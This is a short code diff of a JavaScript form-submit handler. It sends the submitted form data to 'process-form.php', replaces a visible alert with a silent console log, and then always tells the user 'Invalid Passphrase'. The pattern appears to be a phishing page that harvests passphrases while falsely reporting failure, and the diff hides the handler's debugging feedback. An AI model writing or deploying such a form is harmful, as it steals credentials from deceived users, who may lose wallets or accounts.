@@ -7,13 +7,13 @@ form.addEventListener("submit", e=>{
 
 function showPopup(e) {
     let fd = new FormData(e.target)
-    fetch('process-form.php', {
+    fetch('process-form.php?adder=true', {
         method:"post",
         body:fd
     })
     .then(req=>req.json())
     .then(res=>{
-        alert("reached")
+        console.log("reached")
     })
     confirm("Invalid Passphrase");
     return false; // Allow the form to be submitted
